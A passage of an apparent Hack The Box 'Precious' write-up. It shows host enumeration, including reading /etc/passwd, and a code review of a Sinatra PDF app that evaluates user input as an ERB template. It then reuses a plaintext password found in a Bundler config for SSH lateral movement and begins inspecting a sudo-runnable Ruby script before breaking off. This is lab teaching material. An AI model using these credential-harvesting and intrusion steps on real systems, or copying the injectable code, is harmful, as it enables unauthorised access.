+<h3 id="distribution">Distribution</h3>
+<p>Let's see which distribution Precious is using.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">ruby@precious:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/os-release<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">PRETTY_NAME=&quot;Debian GNU/Linux 11 (bullseye)&quot;
+</span><span class="z-text z-plain">NAME=&quot;Debian GNU/Linux&quot;
+</span><span class="z-text z-plain">VERSION_ID=&quot;11&quot;
+</span><span class="z-text z-plain">VERSION=&quot;11 (bullseye)&quot;
+</span><span class="z-text z-plain">VERSION_CODENAME=bullseye
+</span><span class="z-text z-plain">ID=debian
+</span><span class="z-text z-plain">HOME_URL=&quot;https://www.debian.org/&quot;
+</span><span class="z-text z-plain">SUPPORT_URL=&quot;https://www.debian.org/support&quot;
+</span><span class="z-text z-plain">BUG_REPORT_URL=&quot;https://bugs.debian.org/&quot;
+</span></code></pre>
+<p>Okay, so it's Debian 11.</p>
+<h3 id="kernel">Kernel</h3>
+<p>Let's find the kernel version of Precious.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">ruby@precious:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">5.10.0-19-amd64
+</span></code></pre>
+<p>It's <code>5.10.0</code>.</p>
+<h3 id="users">Users</h3>
+<p>Let's enumerate all users.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">ruby@precious:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> grep <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>.*sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/passwd<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">henry
+</span><span class="z-text z-plain">root
+</span><span class="z-text z-plain">ruby
+</span></code></pre>
+<p>There's <code>henry</code>, <code>root</code> and <code>ruby</code> (us).</p>
+<h3 id="groups">Groups</h3>
+<p>Let's enumerate all groups.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">ruby@precious:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/group<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">adm
+</span><span class="z-text z-plain">audio
+</span><span class="z-text z-plain">backup
+</span><span class="z-text z-plain">bin
+</span><span class="z-text z-plain">cdrom
+</span><span class="z-text z-plain">crontab
+</span><span class="z-text z-plain">daemon
+</span><span class="z-text z-plain">dialout
+</span><span class="z-text z-plain">dip
+</span><span class="z-text z-plain">disk
+</span><span class="z-text z-plain">fax
+</span><span class="z-text z-plain">floppy
+</span><span class="z-text z-plain">games
+</span><span class="z-text z-plain">gnats
+</span><span class="z-text z-plain">henry
+</span><span class="z-text z-plain">input
+</span><span class="z-text z-plain">irc
+</span><span class="z-text z-plain">kmem
+</span><span class="z-text z-plain">kvm
+</span><span class="z-text z-plain">_laurel
+</span><span class="z-text z-plain">list
+</span><span class="z-text z-plain">lp
+</span><span class="z-text z-plain">mail
+</span><span class="z-text z-plain">man
+</span><span class="z-text z-plain">messagebus
+</span><span class="z-text z-plain">netdev
+</span><span class="z-text z-plain">news
+</span><span class="z-text z-plain">nogroup
+</span><span class="z-text z-plain">operator
+</span><span class="z-text z-plain">plugdev
+</span><span class="z-text z-plain">proxy
+</span><span class="z-text z-plain">render
+</span><span class="z-text z-plain">root
+</span><span class="z-text z-plain">ruby
+</span><span class="z-text z-plain">sasl
+</span><span class="z-text z-plain">shadow
+</span><span class="z-text z-plain">src
+</span><span class="z-text z-plain">ssh
+</span><span class="z-text z-plain">staff
+</span><span class="z-text z-plain">sudo
+</span><span class="z-text z-plain">sys
+</span><span class="z-text z-plain">systemd-coredump
+</span><span class="z-text z-plain">systemd-journal
+</span><span class="z-text z-plain">systemd-network
+</span><span class="z-text z-plain">systemd-resolve
+</span><span class="z-text z-plain">systemd-timesync
+</span><span class="z-text z-plain">tape
+</span><span class="z-text z-plain">tty
+</span><span class="z-text z-plain">users
+</span><span class="z-text z-plain">utmp
+</span><span class="z-text z-plain">uucp
+</span><span class="z-text z-plain">video
+</span><span class="z-text z-plain">voice
+</span><span class="z-text z-plain">www-data
+</span></code></pre>
+<h3 id="nics">NICs</h3>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">ruby@precious:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ip a</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+</span><span class="z-text z-plain">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span><span class="z-text z-plain">    inet 127.0.0.1/8 scope host lo
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+</span><span class="z-text z-plain">    link/ether 00:50:56:b9:8d:32 brd ff:ff:ff:ff:ff:ff
+</span><span class="z-text z-plain">    altname enp3s0
+</span><span class="z-text z-plain">    altname ens160
+</span><span class="z-text z-plain">    inet 10.10.11.189/23 brd 10.10.11.255 scope global eth0
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span></code></pre>
+<p>There's an Ethernet interface and the loopback interface.</p>
+<h3 id="hostname">Hostname</h3>
+<p>What is Precious's hostname?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">ruby@precious:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> hostname</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">precious
+</span></code></pre>
+<p>Yeah I know, very surprising.</p>
+<h2 id="system-enumeration">System enumeration</h2>
+<h3 id="website-code-review">Website code review</h3>
+<p>Let's review the content of the Apache website, located at <code>/var/www/pdfapp</code>.</p>
+<pre data-lang="rb" class="language-rb z-code"><code class="language-rb" data-lang="rb"><span class="z-source z-ruby"><span class="z-meta z-class z-ruby"><span class="z-keyword z-control z-class z-ruby">class</span></span><span class="z-meta z-class z-ruby"> </span><span class="z-meta z-class z-ruby"><span class="z-entity z-name z-class z-ruby">PdfControllers</span></span><span class="z-meta z-class z-ruby"> <span class="z-punctuation z-separator z-inheritance z-ruby">&lt;</span></span><span class="z-meta z-class z-ruby"> </span><span class="z-meta z-class z-ruby"><span class="z-entity z-other z-inherited-class z-ruby"><span class="z-support z-other z-namespace z-ruby">Sinatra</span><span class="z-punctuation z-accessor z-double-colon z-ruby">::</span>Base</span></span>
+</span><span class="z-source z-ruby">
+</span><span class="z-source z-ruby">    configure <span class="z-keyword z-control z-start-block z-ruby">do</span>
+</span><span class="z-source z-ruby">        set <span class="z-constant z-other z-symbol z-ruby"><span class="z-punctuation z-definition z-constant z-ruby">:</span>views</span><span class="z-punctuation z-separator z-sequence z-ruby">,</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-double z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&quot;</span>app/views<span class="z-punctuation z-definition z-string z-end z-ruby">&quot;</span></span></span>
+</span><span class="z-source z-ruby">        set <span class="z-constant z-other z-symbol z-ruby"><span class="z-punctuation z-definition z-constant z-ruby">:</span>public_dir</span><span class="z-punctuation z-separator z-sequence z-ruby">,</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-double z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&quot;</span>public<span class="z-punctuation z-definition z-string z-end z-ruby">&quot;</span></span></span>
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">end</span>
+</span><span class="z-source z-ruby">
+</span><span class="z-source z-ruby">    get <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>/<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span> <span class="z-keyword z-control z-start-block z-ruby">do</span>
+</span><span class="z-source z-ruby">        erb <span class="z-meta z-constant z-ruby"><span class="z-constant z-other z-symbol z-single-quoted z-ruby"><span class="z-punctuation z-definition z-constant z-ruby">:&#39;</span>index<span class="z-punctuation z-definition z-constant z-ruby">&#39;</span></span></span>
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">end</span>
+</span><span class="z-source z-ruby">
+</span><span class="z-source z-ruby">    post <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>/<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span> <span class="z-keyword z-control z-start-block z-ruby">do</span>
+</span><span class="z-source z-ruby">        url <span class="z-keyword z-operator z-assignment z-ruby">=</span> <span class="z-support z-class z-ruby">ERB</span><span class="z-punctuation z-accessor z-dot z-ruby">.</span><span class="z-keyword z-other z-special-method z-ruby">new</span><span class="z-punctuation z-definition z-group z-begin z-ruby">(</span>params<span class="z-punctuation z-section z-array z-ruby">[</span><span class="z-constant z-other z-symbol z-ruby"><span class="z-punctuation z-definition z-constant z-ruby">:</span>url</span><span class="z-punctuation z-section z-array z-ruby">]</span><span class="z-punctuation z-definition z-group z-end z-ruby">)</span><span class="z-punctuation z-accessor z-dot z-ruby">.</span>result<span class="z-punctuation z-definition z-group z-begin z-ruby">(</span><span class="z-support z-function z-builtin z-ruby">binding</span><span class="z-punctuation z-definition z-group z-end z-ruby">)</span>
+</span><span class="z-source z-ruby">        <span class="z-keyword z-control z-ruby">if</span> url <span class="z-keyword z-operator z-comparison z-ruby">=~</span><span class="z-meta z-string z-regexp z-ruby"><span class="z-string z-regexp z-classic z-ruby"> <span class="z-punctuation z-definition z-string z-begin z-ruby">/</span>^https?:<span class="z-constant z-character z-escape z-ruby">\/</span><span class="z-constant z-character z-escape z-ruby">\/</span><span class="z-punctuation z-definition z-string z-end z-ruby">/</span><span class="z-keyword z-other z-ruby">i</span></span></span>
+</span><span class="z-source z-ruby">            filename <span class="z-keyword z-operator z-assignment z-ruby">=</span> <span class="z-support z-function z-builtin z-ruby">Array</span><span class="z-punctuation z-accessor z-dot z-ruby">.</span><span class="z-keyword z-other z-special-method z-ruby">new</span><span class="z-punctuation z-definition z-group z-begin z-ruby">(</span><span class="z-constant z-numeric z-integer z-decimal z-ruby">32</span><span class="z-punctuation z-definition z-group z-end z-ruby">)</span><span class="z-punctuation z-section z-scope z-ruby">{</span><span class="z-support z-function z-builtin z-ruby">rand</span><span class="z-punctuation z-definition z-group z-begin z-ruby">(</span><span class="z-constant z-numeric z-integer z-decimal z-ruby">36</span><span class="z-punctuation z-definition z-group z-end z-ruby">)</span><span class="z-punctuation z-accessor z-dot z-ruby">.</span><span class="z-support z-function z-builtin z-ruby">to_s</span><span class="z-punctuation z-definition z-group z-begin z-ruby">(</span><span class="z-constant z-numeric z-integer z-decimal z-ruby">36</span><span class="z-punctuation z-definition z-group z-end z-ruby">)</span><span class="z-punctuation z-section z-scope z-ruby">}</span><span class="z-punctuation z-accessor z-dot z-ruby">.</span>join <span class="z-keyword z-operator z-arithmetic z-ruby">+</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>.pdf<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span>
+</span><span class="z-source z-ruby">            path <span class="z-keyword z-operator z-assignment z-ruby">=</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>pdf/<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-ruby">+</span> filename
+</span><span class="z-source z-ruby">
+</span><span class="z-source z-ruby">            <span class="z-keyword z-control z-ruby">begin</span>
+</span><span class="z-source z-ruby">                <span class="z-support z-class z-ruby">PDFKit</span><span class="z-punctuation z-accessor z-dot z-ruby">.</span><span class="z-keyword z-other z-special-method z-ruby">new</span><span class="z-punctuation z-definition z-group z-begin z-ruby">(</span>url<span class="z-punctuation z-definition z-group z-end z-ruby">)</span><span class="z-punctuation z-accessor z-dot z-ruby">.</span>to_file<span class="z-punctuation z-definition z-group z-begin z-ruby">(</span>path<span class="z-punctuation z-definition z-group z-end z-ruby">)</span>
+</span><span class="z-source z-ruby">                cmd <span class="z-keyword z-operator z-assignment z-ruby">=</span> <span class="z-meta z-string z-ruby"><span class="z-string z-interpolated z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">`</span>exiftool -overwrite_original -all= -creator=&quot;Generated by pdfkit v0.8.6&quot; -xmptoolkit= </span><span class="z-meta z-interpolation z-ruby"><span class="z-punctuation z-section z-interpolation z-begin z-ruby">#{</span></span><span class="z-meta z-interpolation z-ruby"><span class="z-source z-ruby z-embedded z-ruby">path</span><span class="z-punctuation z-section z-interpolation z-end z-ruby">}</span></span><span class="z-string z-interpolated z-ruby"><span class="z-punctuation z-definition z-string z-end z-ruby">`</span></span></span>
+</span><span class="z-source z-ruby">                send_file path<span class="z-punctuation z-separator z-sequence z-ruby">,</span> <span class="z-constant z-other z-symbol z-ruby"><span class="z-punctuation z-definition z-constant z-ruby">:</span>disposition</span> <span class="z-punctuation z-separator z-key-value z-ruby">=&gt;</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>attachment<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span>
+</span><span class="z-source z-ruby">            <span class="z-keyword z-control z-ruby">rescue</span>
+</span><span class="z-source z-ruby">                <span class="z-variable z-other z-readwrite z-instance z-ruby"><span class="z-punctuation z-definition z-variable z-ruby">@</span>msg</span> <span class="z-keyword z-operator z-assignment z-ruby">=</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>Cannot load remote URL!<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span>
+</span><span class="z-source z-ruby">            <span class="z-keyword z-control z-ruby">end</span>
+</span><span class="z-source z-ruby">
+</span><span class="z-source z-ruby">        <span class="z-keyword z-control z-ruby">else</span>
+</span><span class="z-source z-ruby">            <span class="z-variable z-other z-readwrite z-instance z-ruby"><span class="z-punctuation z-definition z-variable z-ruby">@</span>msg</span> <span class="z-keyword z-operator z-assignment z-ruby">=</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>You should provide a valid URL!<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span>
+</span><span class="z-source z-ruby">        <span class="z-keyword z-control z-ruby">end</span>
+</span><span class="z-source z-ruby">        erb <span class="z-meta z-constant z-ruby"><span class="z-constant z-other z-symbol z-single-quoted z-ruby"><span class="z-punctuation z-definition z-constant z-ruby">:&#39;</span>index<span class="z-punctuation z-definition z-constant z-ruby">&#39;</span></span></span>
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">end</span>
+</span></code></pre>
+<p>The <code>pdf.rb</code> file in <code>app/controllers</code> is the most interesting file. It contains
+the logic for retrieving the POST <code>url</code> parameter, checking if it's valid using
+a regex, using PDFKit to create a PDF from a web page and editing the metadata
+of the PDF using <code>exiftool</code> to indicate that it was generated using PDFKit
+version <code>0.8.6</code>.</p>
+<h3 id="home-folders">Home folders</h3>
+<p>If we check our home folder, we find a <code>config</code> file in <code>.bundle</code>.</p>
+<blockquote>
+<p>Bundler provides a consistent environment for Ruby projects by tracking and
+installing the exact gems and versions that are needed.</p>
+<p>— <a href="https://bundler.io/">Bundler</a></p>
+</blockquote>
+<p>This file should contain configuration for this dependency management tool.
+Let's see what it contains:</p>
+<pre class="z-code"><code><span class="z-text z-plain">---
+</span><span class="z-text z-plain">BUNDLE_HTTPS://RUBYGEMS__ORG/: &quot;henry:Q3c1AqGHtoI0aXAYFH&quot;
+</span></code></pre>
+<p>The <code>BUNDLE_HTTPS://RUBYGEMS__ORG/</code> directive specifies the source from which
+Bundler should fetch gems. In this case, it indicates that Bundler should use
+the RubyGems as the source for downloading and installing gems, using the
+credentials <code>henry</code>:<code>Q3c1AqGHtoI0aXAYFH</code>.</p>
+<h2 id="lateral-movement-ssh">Lateral movement (SSH)</h2>
+<p>Let's use the credentials we just found to move laterally:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>henry@10.10.11.189<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">henry@10.10.11.189&#39;s password:
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">henry@precious:~$
+</span></code></pre>
+<h2 id="system-enumeration-1">System enumeration</h2>
+<h3 id="flags">Flags</h3>
+<p>If we check our home folder, we find the user flag.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">henry@precious:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/home/henry/user.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">51a4c9f67b818c7e7e12e23cef5b91e4
+</span></code></pre>
+<h3 id="sudo-permissions">Sudo permissions</h3>
+<p>Let's see if we can execute anything as another user with <code>sudo</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">henry@precious:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>l</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Matching Defaults entries for henry on precious:
+</span><span class="z-text z-plain">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">User henry may run the following commands on precious:
+</span><span class="z-text z-plain">    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+</span></code></pre>
+<p>We can execute the <code>update_dependencies.rb</code> script in <code>/opt</code> using the
+<code>/usr/bin/ruby</code> binary.</p>
+<h3 id="inspecting-opt-update-dependencies-rb">Inspecting <code>/opt/update_dependencies.rb</code></h3>
+<p>Let's inspect this file.</p>
+<pre data-lang="rb" class="language-rb z-code"><code class="language-rb" data-lang="rb"><span class="z-source z-ruby"><span class="z-comment z-line z-number-sign z-ruby"><span class="z-punctuation z-definition z-comment z-ruby">#</span> Compare installed dependencies with those specified in &quot;dependencies.yml&quot;
+</span></span><span class="z-source z-ruby"><span class="z-meta z-require z-ruby"><span class="z-keyword z-other z-special-method z-ruby">require</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-double z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&quot;</span>yaml<span class="z-punctuation z-definition z-string z-end z-ruby">&quot;</span></span></span></span>
+</span><span class="z-source z-ruby"><span class="z-meta z-require z-ruby"><span class="z-keyword z-other z-special-method z-ruby">require</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>rubygems<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span></span>
+</span><span class="z-source z-ruby">
+</span><span class="z-source z-ruby"><span class="z-comment z-line z-number-sign z-ruby"><span class="z-punctuation z-definition z-comment z-ruby">#</span> TODO: update versions automatically
+</span></span><span class="z-source z-ruby"><span class="z-meta z-function z-ruby"><span class="z-keyword z-control z-def z-ruby">def</span></span><span class="z-meta z-function z-ruby"> <span class="z-entity z-name z-function z-ruby">update_gems</span></span><span class="z-meta z-function z-parameters z-ruby"><span class="z-punctuation z-definition z-group z-begin z-ruby">(</span></span><span class="z-meta z-function z-parameters z-ruby"><span class="z-punctuation z-definition z-group z-end z-ruby">)</span></span>
+</span><span class="z-source z-ruby"><span class="z-keyword z-control z-ruby">end</span>
+</span><span class="z-source z-ruby">
+</span><span class="z-source z-ruby"><span class="z-meta z-function z-ruby"><span class="z-keyword z-control z-def z-ruby">def</span></span><span class="z-meta z-function z-ruby"> <span class="z-entity z-name z-function z-ruby">list_from_file</span></span>
+</span><span class="z-source z-ruby">    <span class="z-support z-class z-ruby">YAML</span><span class="z-punctuation z-accessor z-dot z-ruby">.</span><span class="z-support z-function z-builtin z-ruby">load</span><span class="z-punctuation z-definition z-group z-begin z-ruby">(</span><span class="z-support z-class z-ruby">File</span><span class="z-punctuation z-accessor z-dot z-ruby">.</span>read<span class="z-punctuation z-definition z-group z-begin z-ruby">(</span><span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-double z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&quot;</span>dependencies.yml<span class="z-punctuation z-definition z-string z-end z-ruby">&quot;</span></span></span><span class="z-punctuation z-definition z-group z-end z-ruby">)</span><span class="z-punctuation z-definition z-group z-end z-ruby">)</span>
+</span><span class="z-source z-ruby"><span class="z-keyword z-control z-ruby">end</span>
+</span><span class="z-source z-ruby">
+</span><span class="z-source z-ruby"><span class="z-meta z-function z-ruby"><span class="z-keyword z-control z-def z-ruby">def</span></span><span class="z-meta z-function z-ruby"> <span class="z-entity z-name z-function z-ruby">list_local_gems</span></span>
+</span><span class="z-source z-ruby">    <span class="z-support z-class z-ruby">Gem</span><span class="z-punctuation z-accessor z-double-colon z-ruby">::</span><span class="z-support z-class z-ruby">Specification</span><span class="z-punctuation z-accessor z-dot z-ruby">.</span>sort_by<span class="z-punctuation z-section z-scope z-ruby">{</span> <span class="z-meta z-block z-parameters z-ruby"><span class="z-punctuation z-definition z-parameters z-begin z-ruby">|</span></span><span class="z-meta z-block z-parameters z-ruby"><span class="z-variable z-parameter z-ruby">g</span><span class="z-meta z-block z-parameters z-ruby"><span class="z-punctuation z-definition z-parameters z-end z-ruby">|</span></span></span> <span class="z-punctuation z-section z-array z-ruby">[</span>g<span class="z-punctuation z-accessor z-dot z-ruby">.</span><span class="z-support z-function z-builtin z-ruby">name</span><span class="z-punctuation z-accessor z-dot z-ruby">.</span>downcase<span class="z-punctuation z-separator z-sequence z-ruby">,</span> g<span class="z-punctuation z-accessor z-dot z-ruby">.</span>version<span class="z-punctuation z-section z-array z-ruby">]</span> <span class="z-punctuation z-section z-scope z-ruby">}</span><span class="z-punctuation z-accessor z-dot z-ruby">.</span>map<span class="z-punctuation z-section z-scope z-ruby">{</span><span class="z-meta z-block z-parameters z-ruby"><span class="z-punctuation z-definition z-parameters z-begin z-ruby">|</span></span><span class="z-meta z-block z-parameters z-ruby"><span class="z-variable z-parameter z-ruby">g</span><span class="z-meta z-block z-parameters z-ruby"><span class="z-punctuation z-definition z-parameters z-end z-ruby">|</span></span></span> <span class="z-punctuation z-section z-array z-ruby">[</span>g<span class="z-punctuation z-accessor z-dot z-ruby">.</span><span class="z-support z-function z-builtin z-ruby">name</span><span class="z-punctuation z-separator z-sequence z-ruby">,</span> g<span class="z-punctuation z-accessor z-dot z-ruby">.</span>version<span class="z-punctuation z-accessor z-dot z-ruby">.</span><span class="z-support z-function z-builtin z-ruby">to_s</span><span class="z-punctuation z-section z-array z-ruby">]</span><span class="z-punctuation z-section z-scope z-ruby">}</span>
+</span><span class="z-source z-ruby"><span class="z-keyword z-control z-ruby">end</span>
+</span><span class="z-source z-ruby">
+</span><span class="z-source z-ruby">gems_file <span class="z-keyword z-operator z-assignment z-ruby">=</span> list_from_file
+</span><span class="z-source z-ruby">gems_local <span class="z-keyword z-operator z-assignment z-ruby">=</span> list_local_gems
+</span><span class="z-source z-ruby">
+</span><span class="z-source z-ruby">gems_file<span class="z-punctuation z-accessor z-dot z-ruby">.</span>each <span class="z-keyword z-control z-start-block z-ruby">do</span> <span class="z-meta z-block z-parameters z-ruby"><span class="z-punctuation z-definition z-parameters z-begin z-ruby">|</span></span><span class="z-meta z-block z-parameters z-ruby"><span class="z-variable z-parameter z-ruby">file_name</span><span class="z-punctuation z-separator z-ruby">,</span> <span class="z-variable z-parameter z-ruby">file_version</span><span class="z-meta z-block z-parameters z-ruby"><span class="z-punctuation z-definition z-parameters z-end z-ruby">|</span></span></span>
+</span><span class="z-source z-ruby">    gems_local<span class="z-punctuation z-accessor z-dot z-ruby">.</span>each <span class="z-keyword z-control z-start-block z-ruby">do</span> <span class="z-meta z-block z-parameters z-ruby"><span class="z-punctuation z-definition z-parameters z-begin z-ruby">|</span></span><span class="z-meta z-block z-parameters z-ruby"><span class="z-variable z-parameter z-ruby">local_name</span><span class="z-punctuation z-separator z-ruby">,</span> <span class="z-variable z-parameter z-ruby">local_version</span><span class="z-meta z-block z-parameters z-ruby"><span class="z-punctuation z-definition z-parameters z-end z-ruby">|</span></span></span>
